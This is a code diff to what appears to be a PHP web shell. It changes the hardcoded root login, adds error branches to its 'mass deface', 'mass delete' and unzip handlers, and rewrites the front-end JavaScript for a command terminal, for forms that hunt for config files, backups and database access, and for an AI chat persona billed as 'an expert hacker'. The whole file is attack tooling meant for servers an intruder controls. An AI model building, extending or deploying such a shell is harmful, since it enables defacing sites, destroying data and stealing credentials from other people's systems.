@@ -2,8 +2,8 @@
 session_start();
 
 // Hardcoded credentials for demonstration. CHANGE THIS IN PRODUCTION!
-$valid_username = "sroot";
-$valid_password_hash = password_hash("PaSsW0rd", PASSWORD_DEFAULT);
+$valid_username = "root";
+$valid_password_hash = password_hash("0xTru3@123#Fam", PASSWORD_DEFAULT);
 
 // Handle login POST request
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
@@ -632,6 +632,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $result['message'] = 'Target directory not found or is not a directory.';
                 }
+            } else {
+                $result['message'] = 'Invalid request for mass deface.';
             }
             break;
 
@@ -654,6 +656,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $result['message'] = 'Target directory not found.';
                 }
+            } else {
+                $result['message'] = 'Invalid request for mass delete.';
             }
             break;
 
@@ -716,6 +720,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         } else {
                             $result['message'] = 'Destination folder not found or not writable.';
                         }
+                    } else {
+                        $result['message'] = 'Invalid zip file path or file does not exist.';
                     }
                 } else {
                     $result['message'] = 'Invalid request for unzip.';
@@ -764,8 +770,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $result['message'] = 'Invalid request for zip.';
                 }
-            } else {
-                $result['message'] = 'PHP Zip extension is not loaded.';
             }
             break;
 
@@ -2037,197 +2041,252 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                             terminalOutput.scrollTop = terminalOutput.scrollHeight;
                         });
                 });
-
-                const commandModal = document.getElementById('commandModal');
-                commandModal.addEventListener('shown.bs.modal', () => {
-                    commandModal.querySelector('input[name="command"]').focus();
-                });
             }
 
-            // --- Mass Tools AJAX Forms ---
-            function handleMassToolForms(formId, resultId) {
-                const form = document.getElementById(formId);
-                if (!form) return;
+            handleModalEvents('commandModal', (event) => {
+                const commandInput = event.currentTarget.querySelector('input[name="command"]');
+                if (commandInput) {
+                    commandInput.focus();
+                }
+                updateTerminalPrompt();
+            });
 
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    const resultArea = document.getElementById(resultId);
-                    const submitButton = form.querySelector('button[type="submit"]');
-                    const originalButtonText = submitButton.innerHTML;
+            // --- AI Chat ---
+            const aiChatModal = document.getElementById('aiChatModal');
+            if (aiChatModal) {
+                const apiKeyInput = document.getElementById('geminiApiKey');
+                const chatMessages = document.getElementById('chatMessages');
+                const chatInput = document.getElementById('chatInput');
+                const sendMessageBtn = document.getElementById('sendMessageBtn');
+                const clearHistoryBtn = document.getElementById('clearHistoryBtn');
+                const chatHistoryKey = 'aiChatHistory_0xTrueDev';
 
-                    resultArea.style.display = 'block';
-                    resultArea.textContent = 'Processing...';
-                    submitButton.disabled = true;
-                    submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';
+                let chatHistory = [];
 
-                    const formData = new FormData(form);
+                // Load API Key from localStorage
+                apiKeyInput.value = localStorage.getItem('geminiApiKey') || '';
+
+                // Save API Key to localStorage
+                apiKeyInput.addEventListener('input', () => {
+                    localStorage.setItem('geminiApiKey', apiKeyInput.value);
+                });
+                
+                apiKeyInput.addEventListener('change', () => {
+                    showToast('API Key saved locally.');
+                });
+
+                function loadHistory() {
+                    const history = localStorage.getItem(chatHistoryKey);
+                    chatHistory = history ? JSON.parse(history) : [];
+                    chatMessages.innerHTML = '';
+                    chatHistory.forEach(item => appendMessage(item.sender, item.message, false, false)); // Don't save again when loading
+                }
+
+                function saveHistory() {
+                    localStorage.setItem(chatHistoryKey, JSON.stringify(chatHistory));
+                }
+
+                function appendMessage(sender, message, save = true, isHtml = false) {
+                    const messageContainer = document.createElement('div');
+                    messageContainer.classList.add('message-container', 'mb-2');
+
+                    const messageElement = document.createElement('div');
+                    
+                    if (sender === 'user') {
+                        messageElement.innerHTML = `<strong>You:</strong><div class="p-2 rounded bg-primary bg-opacity-25">${message.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
+                    } else {
+                        const renderedMessage = isHtml ? message : marked.parse(message);
+                        messageElement.innerHTML = `<strong>0xTrue-Dev AI:</strong><div class="p-2 rounded bg-secondary bg-opacity-25">${renderedMessage}</div>`;
+                        
+                        if (!isHtml) { // Don't add copy button to spinners or pure HTML messages
+                            const copyBtn = document.createElement('button');
+                            copyBtn.innerHTML = '<i class="far fa-copy"></i>';
+                            copyBtn.className = 'copy-btn';
+                            copyBtn.title = 'Copy message';
+                            copyBtn.addEventListener('click', () => {
+                                navigator.clipboard.writeText(message).then(() => {
+                                    copyBtn.innerHTML = '<i class="fas fa-check"></i>';
+                                    showToast('Copied to clipboard!');
+                                    setTimeout(() => {
+                                        copyBtn.innerHTML = '<i class="far fa-copy"></i>';
+                                    }, 2000);
+                                });
+                            });
+                            messageContainer.appendChild(copyBtn);
+                        }
+                    }
+
+                    messageContainer.appendChild(messageElement);
+                    chatMessages.appendChild(messageContainer);
+                    chatMessages.scrollTop = chatMessages.scrollHeight;
+
+                    if (save) {
+                        chatHistory.push({ sender, message });
+                        saveHistory();
+                    }
+                }
+
+                function sendMessage() {
+                    const message = chatInput.value.trim();
+                    const apiKey = apiKeyInput.value.trim();
+
+                    if (!message) return;
+                    if (!apiKey) {
+                        showToast('Please enter your Gemini API Key.', 'error');
+                        apiKeyInput.focus();
+                        return;
+                    }
+
+                    appendMessage('user', message);
+                    chatInput.value = '';
+                    sendMessageBtn.disabled = true;
+                    
+                    appendMessage('ai', '<div class="d-flex justify-content-center p-3"><div class="spinner-border spinner-border-sm" role="status"><span class="visually-hidden">Loading...</span></div></div>', true, true);
+
+                    // Prepare history for API - don't include the spinner message
+                    const apiHistory = chatHistory.slice(0, -1).map(item => ({
+                        role: item.sender === 'user' ? 'user' : 'model',
+                        parts: [{ text: item.message }]
+                    }));
 
                     fetch(window.location.href, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.success) {
-                                resultArea.textContent = data.output || 'Completed successfully, but no output was returned.';
-                            } else {
-                                resultArea.textContent = 'Error: ' + (data.output || 'Unknown error.');
-                            }
-                        })
-                        .catch(error => {
-                            resultArea.textContent = 'Request failed: ' + error;
-                        })
-                        .finally(() => {
-                            submitButton.disabled = false;
-                            submitButton.innerHTML = originalButtonText;
-                        });
-                });
-            }
-
-            handleMassToolForms('findConfigsForm', 'findConfigsResult');
-            handleMassToolForms('findBackupsForm', 'findBackupsResult');
-            handleMassToolForms('dbConnectForm', 'dbConnectResult');
-
-            // Handle Zip and Unzip forms
-            handleMassToolForms('zipForm', 'zipResult'); // Assuming a result area for zip
-            handleMassToolForms('unzipForm', 'unzipResult'); // Assuming a result area for unzip
-
-            handleModalEvents('zipModal', (event) => {
-                const modal = event.currentTarget;
-                modal.querySelector('#zipPath').value = '<?php echo htmlspecialchars($path); ?>';
-                modal.querySelector('#zipName').value = 'archive.zip';
-            });
-
-            handleModalEvents('unzipModal', (event) => {
-                const modal = event.currentTarget;
-                modal.querySelector('#unzipPath').value = '<?php echo htmlspecialchars($path); ?>/';
-                modal.querySelector('#unzipDestination').value = '<?php echo htmlspecialchars($path); ?>';
-            });
-
-            // File search functionality
-            const fileSearchInput = document.getElementById('fileSearchInput');
-            if (fileSearchInput) {
-                fileSearchInput.addEventListener('keyup', function() {
-                    const searchTerm = this.value.toLowerCase();
-                    const tableRows = document.querySelectorAll('.table tbody tr');
-
-                    tableRows.forEach(row => {
-                        const fileName = row.querySelector('td:first-child a').textContent.toLowerCase();
-                        if (fileName.includes(searchTerm)) {
-                            row.style.display = '';
-                        } else {
-                            row.style.display = 'none';
-                        }
-                    });
-                });
-            }
-
-            handleModalEvents('serverInfoModal', (event) => {
-                const contentArea = event.currentTarget.querySelector('#serverInfoContent');
-                contentArea.innerHTML = '<div class="text-center"><span class="spinner-border"></span><p>Loading...</p></div>';
-                fetch('?action=serverInfo')
-                    .then(response => response.text())
-                    .then(data => {
-                        contentArea.innerHTML = data;
-                    })
-                    .catch(err => {
-                        contentArea.innerHTML = '<p class="text-danger">Failed to load server info.</p>';
-                    });
-            });
-
-            // AI Chat functionality
-            const geminiApiKeyInput = document.getElementById('geminiApiKey');
-            const chatMessagesDiv = document.getElementById('chatMessages');
-            const chatInput = document.getElementById('chatInput');
-            const sendMessageBtn = document.getElementById('sendMessageBtn');
-
-            // Load API key from local storage
-            if (localStorage.getItem('geminiApiKey')) {
-                geminiApiKeyInput.value = localStorage.getItem('geminiApiKey');
-            }
-
-            geminiApiKeyInput.addEventListener('change', function() {
-                localStorage.setItem('geminiApiKey', this.value);
-                showToast('Gemini API Key saved locally.', 'success');
-            });
-
-            function addMessage(sender, message) {
-                const messageElement = document.createElement('div');
-                messageElement.classList.add('mb-2', sender === 'user' ? 'text-end' : 'text-start');
-                const bubble = document.createElement('div');
-                bubble.classList.add('p-2', 'rounded', 'd-inline-block');
-                if (sender === 'user') {
-                    bubble.classList.add('bg-primary', 'text-white');
-                } else {
-                    bubble.classList.add('bg-secondary', 'text-white');
-                }
-                bubble.innerHTML = marked.parse(message); // Render Markdown
-                messageElement.appendChild(bubble);
-                chatMessagesDiv.appendChild(messageElement);
-                chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight; // Scroll to bottom
-            }
-
-            async function sendAIChatMessage(message) {
-                const apiKey = geminiApiKeyInput.value;
-                if (!apiKey) {
-                    showToast('Please enter your Gemini API Key.', 'error');
-                    return;
-                }
-
-                addMessage('user', message);
-                chatInput.value = '';
-                sendMessageBtn.disabled = true;
-                sendMessageBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Sending...';
-
-                try {
-                    const response = await fetch(window.location.href, {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/json'
+                            'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
                             action: 'aiChat',
                             apiKey: apiKey,
-                            message: message
+                            message: message,
+                            history: apiHistory
                         })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        chatMessages.removeChild(chatMessages.lastChild); // Remove spinner
+                        chatHistory.pop(); // Remove spinner placeholder from history
+
+                        if (data.success) {
+                            appendMessage('ai', data.response);
+                        } else {
+                            const errorMsg = `Error: ${data.error || 'Unknown error'}`;
+                            appendMessage('ai', errorMsg, true);
+                            showToast(data.error || 'An unknown error occurred.', 'error');
+                        }
+                    })
+                    .catch(error => {
+                        chatMessages.removeChild(chatMessages.lastChild);
+                        chatHistory.pop();
+                        const errorMsg = `Error: ${error.message}`;
+                        appendMessage('ai', errorMsg, true);
+                        showToast(`Request failed: ${error.message}`, 'error');
+                    })
+                    .finally(() => {
+                        sendMessageBtn.disabled = false;
+                        chatInput.focus();
                     });
+                }
 
-                    const data = await response.json();
-
-                    if (data.success) {
-                        addMessage('ai', data.response);
-                    } else {
-                        addMessage('ai', 'Error: ' + (data.error || 'Unknown error.'));
-                        showToast('AI Chat Error: ' + (data.error || 'Unknown error.'), 'error');
+                sendMessageBtn.addEventListener('click', sendMessage);
+                chatInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        sendMessage();
                     }
-                } catch (error) {
-                    addMessage('ai', 'Request failed: ' + error.message);
-                    showToast('AI Chat Request Failed: ' + error.message, 'error');
-                } finally {
-                    sendMessageBtn.disabled = false;
-                    sendMessageBtn.innerHTML = 'Send';
+                });
+
+                clearHistoryBtn.addEventListener('click', () => {
+                    if (confirm('Are you sure you want to clear the chat history? This cannot be undone.')) {
+                        // Clear the in-memory array
+                        chatHistory = [];
+                        // Clear the storage
+                        localStorage.removeItem(chatHistoryKey);
+                        // Clear the visual display
+                        chatMessages.innerHTML = '';
+                        
+                        // Add the initial greeting back and save it as the new history
+                        appendMessage('ai', "Yo. I'm 0xTrue-Dev, an expert hacker. Got a problem? Lay it on me.", true);
+                        
+                        showToast('Chat history cleared.');
+                    }
+                });
+
+                aiChatModal.addEventListener('show.bs.modal', () => {
+                    loadHistory();
+                    if (chatHistory.length === 0) {
+                         appendMessage('ai', "Yo. I'm 0xTrue-Dev, an expert hacker. Got a problem? Lay it on me.", true);
+                    }
+                    setTimeout(() => chatInput.focus(), 500); // Delay focus slightly for modal transition
+                });
+            }
+
+            // --- Search Files ---
+            const fileSearchInput = document.getElementById('fileSearchInput');
+            if (fileSearchInput) {
+                fileSearchInput.addEventListener('keyup', function() {
+                    const filter = fileSearchInput.value.toLowerCase();
+                    const rows = document.querySelectorAll('.table tbody tr');
+                    rows.forEach(row => {
+                        const cell = row.querySelector('td:first-child');
+                        if (cell) {
+                            const text = cell.textContent || cell.innerText;
+                            if (text.toLowerCase().indexOf(filter) > -1) {
+                                row.style.display = '';
+                            } else {
+                                row.style.display = 'none';
+                            }
+                        }
+                    });
+                });
+            }
+
+            // --- AJAX Form Submissions for Mass Tools ---
+            function handleAjaxForm(formId, resultId) {
+                const form = document.getElementById(formId);
+                if (form) {
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        const resultEl = document.getElementById(resultId);
+                        const submitButton = form.querySelector('button[type="submit"]');
+                        const originalButtonText = submitButton.innerHTML;
+                        submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
+                        submitButton.disabled = true;
+                        resultEl.style.display = 'block';
+                        resultEl.textContent = 'Searching...';
+
+                        const formData = new FormData(form);
+                        const jsonData = {};
+                        formData.forEach((value, key) => { jsonData[key] = value; });
+                        
+                        fetch(window.location.href, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(jsonData)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                resultEl.textContent = data.output;
+                            } else {
+                                resultEl.textContent = 'Error: ' + data.output;
+                            }
+                        })
+                        .catch(error => {
+                            resultEl.textContent = 'Request failed: ' + error;
+                        })
+                        .finally(() => {
+                            submitButton.innerHTML = originalButtonText;
+                            submitButton.disabled = false;
+                        });
+                    });
                 }
             }
 
-            if (sendMessageBtn) {
-                sendMessageBtn.addEventListener('click', function() {
-                    const message = chatInput.value.trim();
-                    if (message) {
-                        sendAIChatMessage(message);
-                    }
-                });
-
-                chatInput.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter' && !e.shiftKey) {
-                        e.preventDefault();
-                        const message = chatInput.value.trim();
-                        if (message) {
-                            sendAIChatMessage(message);
-                        }
-                    }
-                });
-            }
+            handleAjaxForm('findConfigsForm', 'findConfigsResult');
+            handleAjaxForm('findBackupsForm', 'findBackupsResult');
+            handleAjaxForm('dbConnectForm', 'dbConnectResult');
         });
     </script>
+
 </body>
 </html>
